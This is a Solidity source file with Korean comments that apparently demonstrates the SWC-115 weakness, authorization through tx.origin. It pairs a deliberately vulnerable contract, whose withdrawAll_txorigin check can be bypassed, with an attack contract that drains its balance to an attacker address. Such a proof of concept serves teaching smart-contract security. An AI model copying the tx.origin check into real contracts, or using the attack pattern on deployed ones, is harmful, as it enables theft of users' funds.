// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

//swc115는 공격을 받는 입장
contract swc115{
    address public owner;
    event contract_addr_event(address tx_origin, address msg_sender, address _owner);
    event ether_storage(uint value_, address ether_sender);
    event with_ether(address tx_origin, address msg_sender, address _owner);

    //swc115 컨트랙트의 owner를 설정 owner = msg.sender = tx.origin
    function contract_addr(address _owner){
        owner = _owner;
        emit contract_addr_event(tx.origin, msg.sender, owner);
    }

    //swc115 컨트랙트에 이더 값을 전송하는 부분
    function a() public payable {
        emit ether_storage(msg.value, msg.sender);
    }

    //tx.origin이 있어 취약한 함수, require를 우회하여 값을 출금해갈 수 있음
    function withdrawAll_txorigin(address _recipient) public {
        //require(tx.origin == owner);
        require(tx.origin == owner,
        "msg.sender = owner not same");
        emit with_ether(tx.origin, msg.sender, owner);
        _recipient.transfer(this.balance);
    }
    
    //해당 함수는, tx.origin와 msg.sender를 비교하기 위해 추가한 함수
    //여기선 msg.sender를 사용
    function withdrawAll_sender(address _recipient) public {
        //require(tx.origin == owner);
        require(msg.sender == owner,
        "msg.sender = owner not same, function call only owner! owner addr : 0x50a3c7460b3bd111b4330ac90f8410c7085298b7");
        emit with_ether(tx.origin, msg.sender, owner);
        _recipient.transfer(this.balance);
    }
}

contract attack{
    swc115 swc115contract;
    address attacker;

    //swc115contract = 공격당하는 컨트랙트의 주소, attackaddress는 값을 받을 EOA 주소
    function set(swc115 _swc115contract, address _attackaddress){
        swc115contract = _swc115contract;
        attacker = _attackaddress;
    }
    //tx.origin==owner가 설정된 함수를 호출
    function attack_contract() payable{
        swc115contract.withdrawAll_txorigin(attacker);
    }

    //msg.sender==owner가 설정된 함수를 호출
    function attack_contract2() payable{
        swc115contract.withdrawAll_sender(attacker);
    }
}